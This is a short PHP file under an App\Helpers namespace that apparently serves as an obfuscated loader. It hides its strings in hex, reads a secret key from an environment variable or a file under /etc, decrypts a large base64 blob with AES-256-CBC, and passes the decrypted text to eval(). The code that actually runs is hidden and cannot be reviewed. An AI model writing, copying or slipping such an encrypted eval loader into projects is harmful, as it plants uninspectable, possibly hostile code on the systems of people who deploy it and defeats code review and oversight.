<?php
namespace App\Helpers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('8pPeI4VOYiNs+ImLlqrR/Q==');

$c=base64_decode(

'PVaiq+4mdpZX/9kovpCySHooGUsa4yaB4mQ2oblNnT+3JKW2TxolKcZqstjjYhiQXZ/gYDWLXzAD' .
'3ATaQZYUl0e2MmJzsgvAGswFisfHXN5DWS8PhOXmFPu2kvX86Qq7N9bGBDMnmf5AbCJSdB2tH/yX' .
'VUP/Jeth9Qd7gRuBtnO8R56B3afW3vIWIg6QH7GYv7tdRBbO7+FGRByNtAqajoN7IkVxvJgGlrn7' .
'accCBug64kllYyBU/+OET4RQOd/QFrHl+6HcPMxUMI56GiI4+3SbXhtn/ohyEgRc3GZsetxBfigb' .
'SVl7HUJr8cUW+/2HzQ7HkyKQY0n/8LKmdlb3NszrjLbjI9Pb24+v0dCT/AfUP4Bjvv979QyLjp15' .
'ltUYlGcbHctjzadJPjyJrr93En0Um2GTzh9uNDoepoCuVwybqXLO0vNwTymyxD/QOUNSwR0+RMvu' .
'1Et3OEYolDED4zzZyjMjUPf6d7FTo3syZcKR2eTAcNiDnMvQii5TIkvyuC/QMMnYpTjdaOHTq39w' .
'pfysvWzTvZZFgFGBsqwNY7eQ+f4GcIN/Z5mXmmMXb5x39ijYt0Zl2AbsDEbCl3h4PxxIfffZRaDu' .
'tW4OV3eAdx8FhtFbGCgZxQtMXA9V/PGn1OEnPpYWGwdAjBNFEPA1zzvYTrLSyjTrpPisrzt7Yc7E' .
'yVgaHU2FDPwwUb4bE0Bs+sd94lrYFbV/TcAAZAH1tcfbnSjUuHqKsRG+0siuSaEh6yBEiuOGStd4' .
'I//rMETlHOJcmNy5Pq706O/tu3ODwGgdLkELwkiwF5gBToe2pk//zn0/owNPaTHbxTUADQoAKqgT' .
'DnDxybJUEROraOMOWOd1bC/bQD0tOSQZI/nHvmm4s2T4StI9kRZ77EIKe2NtJED6lwUE8D1vq5pf' .
'b2Zdx68UIctengxJH5rZiNOYzRbREvgmyw36n+kORfE1NVQqy3bceFW4vbGveXQ1NyOgVLRTB9GT' .
'fZbGDBedmi7O2/+G7kYG7Rlq12LYNffUFYdgw7fa/uhoZ3isExkD5go+J788m3IIBbrgSjKnbe0J' .
'U2I47wubQmK6IrAaLzmuMTv6UV9Vei6ZvB2/lbJe6fgyBBG6Xi2QAWtpg2yZb8MoBNIHwbUPzZod' .
'idZV1dJqYiIejFPNdJ7SLcOrzaq/x+fiG1AJrsYOkl+eSWUiKTUiTzvM0RjuE9yYH4T/W1POptfm' .
'9M4Hu9ZCwD5n9D1pfDCAli7/gxKhZZ8bm6VyFDX80UHSdO9xYjcZsvZzuWXQAXWhxrEwgALsuKFh' .
'qmtuJczaVkC/MTx1tyAonu4SiY8oAo0tmzK4f8Wp5UZ5TThnurCCYxZEbYjI37Ztl5Jip6BrvzdU' .
'CSWtZaBt9vDZL5sIVPS65a5iuAplQW66zpeZ8YfjEbstzY+UgAFlgrYE5eV/ub8/jHMc/Ny72yVa' .
'SazyD7vkCYrxdG7c0laRoBy+FsqRo0PapsISkXNs97abtCT6WK81VHqTWkF+N9va1biIS2n1jiP7' .
'cWa3qo7wQcl+JmikeI73eULPR2TIN4ZjrZAv/to/jsaZwdDTR3xX0DswhQIUGcaHu7fZJe6GJzC5' .
'TH58PDuxCIMGbArFNceqsbjhmH627hdMQSAA4uF2K/rlR3TG/uWBvFJc6BSBozEOoHwCAVu1oSEc' .
'd1Eg4hjysPtGYfd61f0Hu3mcEYvMjFNnIKqGFnAFQE81sXuZso3k3UJ/V2D5BwISP/TOQApoAV1S' .
'z18URA67HMqf9NJiJSB/RZV2YI6kmy6MCYzcBVx31FnktHzVNIEUqmYmb1P2seHXwpXKLmJHNOQS' .
'DsQ/mhKua8dDQI2d2cjr1OsR3F9Q7gAhFvYvTYs9H4PF6GdnGmv+PvhpxiGo8D/buh3plkIMWMH4' .
'qvYhVH1EwhrOoG+KZouZe4uch4fjgQ/dYqFsxGbJybvOakw95n1yiPjGzo4mmppUY+Utb1nPxmMB' .
'/ryRCFrSVLJ5MrD4DCe2FPY5CIPhK1CIYMt/OgySwmu0/vplakqxcJajlDjiwqDqNh5/iQ7pSUNb' .
'j8EiBux9yytA74kvRAq1WjO7ogQFDvMx5aA+F/xNS8q0SjyLegtx4DkGNhwkpRYJdwmCvL7PTFcH' .
'yVk6+6G1mraBxH5Ln3HmYIa3OlvkTspyJeErxSlCsM6tV1Fo'

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

